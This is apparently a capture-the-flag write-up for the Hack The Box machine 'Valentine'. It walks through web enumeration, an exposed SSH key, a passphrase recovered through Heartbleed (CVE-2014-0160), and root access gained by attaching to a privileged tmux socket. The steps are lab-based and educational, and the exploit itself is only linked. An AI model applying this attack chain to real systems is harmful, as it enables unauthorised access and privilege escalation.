# Valentine

**Valentine** is a Linux-based Hack The Box machine focused on web enumeration, sensitive information disclosure, cryptographic weaknesses, SSH access, and a simple privilege escalation through an exposed `tmux` session.

## Overview

| Information          | Details                           |
| -------------------- | --------------------------------- |
| Machine              | Valentine                         |
| Platform             | Hack The Box                      |
| OS                   | Linux                             |
| IP Address           | `10.129.232.136`                  |
| Difficulty           | Easy                              |
| Initial Access       | Heartbleed information disclosure |
| User                 | `hype`                            |
| Privilege Escalation | Exposed `tmux` session            |
| Root                 | `root`                            |

---

## Enumeration

### Nmap Scan

We start with a full TCP port scan against the target.

```text
Nmap scan report for 10.129.232.136
Host is up, received syn-ack ttl 63 (0.25s latency).
Not shown: 997 closed tcp ports (reset)

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

We then perform service and version detection.

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
```

The HTTPS certificate reveals the hostname:

```text
commonName=valentine.htb
```

We therefore add the hostname to `/etc/hosts`:

```text
10.129.232.136 valentine.htb
```

The target is running an older Ubuntu-based system with Apache 2.2.22 and OpenSSH 5.9p1.

---

## Web Enumeration

We continue enumeration using directory fuzzing.

The following endpoints are discovered:

```text
/omg.jpg
/dev/
/encode.php
/decode
/dev/hype_key
/dev/notes.txt
/decode.php
/encode
/index
/index.php
```

The `/dev/` directory immediately becomes interesting.

### `/dev/notes.txt`

The notes contain the following tasks:

```text
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

We also find the following files:

```text
/dev/hype_key
/dev/notes.txt
```

### Encoder / Decoder

The `/encode` and `/decode` functionality appears to use simple Base64 encoding and decoding.

The more interesting discovery is `/dev/hype_key`.

Requesting:

```text
https://10.129.232.136/dev/hype_key
```

returns a hex-encoded SSH private key.

After decoding the key, we save it locally as:

```text
hype_key
```

The key is protected by a passphrase, so we need to obtain the passphrase before we can use it.

---

# Initial Foothold

## Heartbleed Discovery

During HTTPS enumeration, we identify a potential information disclosure vulnerability.

The target is running an old version of OpenSSL, making **Heartbleed (CVE-2014-0160)** a relevant vulnerability to investigate.

Heartbleed can allow an attacker to retrieve data from the memory of a vulnerable TLS process.

We can exploit the vulnerability using Metasploit or the referenced Exploit-DB PoC.

One approach is:

```text
msfconsole
```

Alternatively, the exploit used during the process was:

```text
https://www.exploit-db.com/exploits/32745
```

The Heartbleed exploit is run multiple times to retrieve leaked memory.

Among the returned data we eventually find Base64-encoded content:

```text
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

Decoding the Base64 string gives:

```text
heartbleedbelievethehype
```

This turns out to be the passphrase protecting the `hype` SSH key.

### Credentials / Key Information

| Item           | Value                      |
| -------------- | -------------------------- |
| Username       | `hype`                     |
| SSH Key        | `hype_key`                 |
| Key Passphrase | `heartbleedbelievethehype` |

---

## SSH Access

Before using the private key, we restrict its permissions:

```bash
chmod 600 hype_key
```

We initially attempt to connect:

```bash
ssh -i hype_key hype@10.129.232.136
```

The connection produces:

```text
sign_and_send_pubkey: no mutual signature supported
```

This occurs because the modern SSH client does not support the older signature algorithm used by the target by default.

After accounting for the legacy SSH configuration, we are able to authenticate as `hype`.

We now have access to the user's home directory:

```text
hype@Valentine:~$ ls

Desktop
Downloads
Pictures
Templates
Videos
Documents
Music
Public
user.txt
```

The user flag is located at:

```text
/home/hype/user.txt
```

---

# Privilege Escalation

With user access established, we begin looking for privilege escalation opportunities.

A particularly interesting discovery appears in the user's shell history.

```bash
history
```

Relevant commands include:

```text
1  exit
2  exot
3  exit
4  ls -la
5  cd /
6  ls -la
7  cd .devs
8  ls -la
9  tmux -L dev_sess
10 tmux a -t dev_sess
11 tmux --help
12 tmux -S /.devs/dev_sess
13 exit
```

The `.devs` directory is especially interesting.

```bash
cd /.devs
ls -lah
```

Output:

```text
total 8.0K
drwxr-xr-x  2 hype 4.0K Sep  9 04:22 .
drwxr-xr-x 26 root 4.0K Aug 24  2022 ..
srw-rw----  1 hype    0 Sep  9 04:22 dev_sess
```

We have discovered a `tmux` socket:

```text
/.devs/dev_sess
```

The shell history indicates that a `tmux` session named `dev_sess` was being used.

More importantly, the session is running with elevated privileges.

---

## Exploiting the Exposed tmux Session

We connect directly to the exposed socket:

```bash
tmux -S /.devs/dev_sess
```

This attaches us to the existing `tmux` session.

We can then verify our privileges:

```bash
id
```

The result is:

```text
uid=0(root) gid=0(root) groups=0(root)
```

We have successfully escalated from the `hype` user to `root`.

---

# Root Access

With root privileges, we can access the root flag:

```bash
cat /root/root.txt
```

The machine is now fully compromised.

---

# Attack Path Summary

The complete attack chain was:

```text
Nmap Enumeration
        |
        v
Web Enumeration
        |
        v
/dev/hype_key
        |
        v
Encrypted SSH Private Key
        |
        v
Heartbleed (CVE-2014-0160)
        |
        v
Leaked Base64 Data
        |
        v
SSH Key Passphrase
        |
        v
SSH Access as hype
        |
        v
User Flag
        |
        v
Shell History Enumeration
        |
        v
Exposed tmux Socket
        |
        v
Attach to tmux Session
        |
        v
root
        |
        v
Root Flag
```

---

# Key Takeaways

* **Directory enumeration** can expose sensitive development files and credentials.
* Old TLS implementations should always be checked for vulnerabilities such as **Heartbleed (CVE-2014-0160)**.
* Sensitive information leaked through a memory disclosure vulnerability can sometimes provide credentials that are not directly exposed by the application.
* Legacy SSH configurations may require compatibility considerations when connecting with modern clients.
* **Shell history** can reveal useful information about previously executed administrative commands.
* Exposed `tmux` sockets can become a serious privilege escalation vector when the underlying session belongs to `root`.
* A seemingly simple web application can provide multiple pieces of information that eventually form a complete attack chain.

---

# Tools Used

* Nmap
* Feroxbuster
* Burp Suite
* CyberChef
* Metasploit Framework
* Heartbleed exploit / Exploit-DB PoC
* SSH
* tmux

---

# Conclusion

Valentine demonstrates how seemingly small weaknesses can be chained together to achieve complete system compromise.

The attack began with web enumeration and the discovery of an encrypted SSH key. Heartbleed then provided the missing passphrase, allowing SSH access as `hype`. Finally, enumeration of the user's history revealed an exposed `tmux` socket associated with a privileged session.

By attaching to that session, we obtained a root shell and completed the machine.
